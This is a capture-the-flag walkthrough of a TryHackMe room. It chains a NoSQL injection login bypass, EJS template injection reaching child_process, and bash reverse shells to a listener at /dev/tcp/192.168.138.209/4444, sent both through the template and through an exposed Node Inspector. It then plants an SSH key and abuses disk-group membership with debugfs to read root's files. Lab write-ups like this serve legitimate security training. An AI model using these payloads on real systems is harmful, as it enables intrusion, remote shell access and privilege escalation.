---

Name: Do not disturb
Difficulty: Medium
URL: https://tryhackme.com/room/hh-donotdisturb-84a45644
Description: Sign's on the door. Room's active. You have access you were never given, and so does he.

---

# Scanning the services
```bash
$  rustscan -a 10.113.154.27 -r 1-65535 --ulimit 5000 -- -sC -sV
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 84:bb:55:d4:d8:50:f6:8b:b5:31:ae:19:01:39:fd:22 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKNqB233Or8NN3hi5+DJFhRJlxRwLIbC518R5Mo/FtAwFOgjnNiO6Oe26UoMkgOM0thzYVk073Z/bF7v7OCAuDo=
|   256 43:e8:ce:e8:69:73:37:fe:71:65:4a:10:c3:19:79:9b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINRlNc6/PNhkToByRpbazXcY5JvUg9MtCu1rIra2bX6N
80/tcp open  http    syn-ack Node.js (Express middleware)
|_http-title: Byte Lotus &mdash; Poolside
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Authentication Bypass

Since the application is built with Express, we test for a NoSQL Injection.

```bash
curl -i \
-X POST \
--data 'username[$ne]=1&password[$ne]=1' \
http://10.113.154.27/login
```

We receive a `302` redirect to `/staff` together with a valid session cookie, meaning the payload successfully bypassed authentication.

The `$ne` operator means "not equal". If the application performs a MongoDB query like:

```javascript
db.users.findOne({
    username: req.body.username,
    password: req.body.password
})
```

our request becomes:

```javascript
db.users.findOne({
    username: { "$ne": "1" },
    password: { "$ne": "1" }
})
```

which matches almost every user in the database.

---

# Cabana Desk

After logging in, we reach the **Cabana Desk** page.

```txt
Signed in as attendant. Customise the guest booking-confirmation message below.
Confirmation template (EJS — use <%= guest %> to personalise)
```

The application lets us preview the template before saving it, which immediately makes us think about SSTI.

## SSTI

First we confirm that the template is actually being evaluated.

```txt
<%= 7 * 7 %>
```

The preview returns:

```txt
49
```

Since the expression is evaluated instead of printed, we have confirmed an **EJS Server-Side Template Injection**.

## Command Execution

Now we can execute arbitrary Node.js code.

```txt
<%= global.process.mainModule.require('child_process').execSync('id') %>
```

Output:

```txt
uid=996(poolside) gid=996(poolside) groups=996(poolside)
```

This confirms command execution as the `poolside` user.

## Reverse Shell

Start a listener.

```bash
nc -lvnp 4444
```

Then execute:

```txt
<%= global.process.mainModule.require('child_process').execSync("bash -c 'bash -i >& /dev/tcp/192.168.138.209/4444 0>&1'") %>
```

We receive a reverse shell as `poolside`.

---

# Enumerating as poolside

Looking through the system, we notice another interesting user:

```txt
poolside:x:996:996::/home/poolside:/usr/sbin/nologin
pipelinesvc:x:995:995::/home/pipelinesvc:/usr/sbin/nologin
```

Inside `/opt/pipelinesvc/telemetry` we find a Node.js application called `processor.js`.

We also notice that it is running with the Node Inspector enabled.

```bash
ps aux | grep processor
```

```txt
/usr/bin/node --inspect=127.0.0.1:9229 processor.js
```

Let's verify that the debugger is actually listening.

```bash
ss -lntp | grep 9229
```

```txt
LISTEN 0 511 127.0.0.1:9229
```

Since the service only listens on localhost, we create an SSH tunnel.

---

# Accessing the Node Inspector

First we generate an SSH key on the target and add it to `authorized_keys`.

```bash
mkdir -p ~/.ssh
ssh-keygen -t ed25519 -N "" -f ~/.ssh/id_ed25519
cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys
```

Because the account uses `/usr/sbin/nologin`, a normal SSH session immediately closes. However, using the `-N` option still allows us to create a tunnel.

```bash
ssh -N \
-i id_ed25519 \
-L 9229:127.0.0.1:9229 \
poolside@10.113.154.27
```

Now the debugger is available locally.

```bash
npx wscat -c ws://127.0.0.1:9229/<UUID>
```

We first verify that we have access to the Node.js runtime.

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"typeof process"}}
```

```txt
object
```

We also verify that `process.mainModule` exists.

```json
{"id":6,"method":"Runtime.evaluate","params":{"expression":"process.mainModule"}}
```

Since it does, we can use it to require modules and execute commands.

```json
{"id":7,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('id').toString()"}}
```

Output:

```txt
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

## Reverse Shell as pipelinesvc

Start another listener.

```bash
nc -lvnp 4444
```

Execute:

```json
{"id":8,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').exec(\"bash -c 'bash -i >& /dev/tcp/192.168.138.209/4444 0>&1'\")"}}
```

We now have a shell as `pipelinesvc`.

---

# Privilege Escalation

Running `id` reveals something very interesting.

```txt
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

The user belongs to the **disk** group, which allows direct access to block devices.

Let's identify the root partition.

```bash
lsblk -f
```

The root filesystem is located on:

```txt
/dev/nvme0n1p1
```

Trying to mount it fails because mounting requires root privileges.

Instead, we use `debugfs` to read the filesystem directly.

```bash
debugfs /dev/nvme0n1p1
```

Inside `debugfs` we can browse the filesystem.

```text
ls /
ls /root
cat /root/root.txt
```

Finally, we obtain the root flag.

```txt
THM{REDACTED}
```
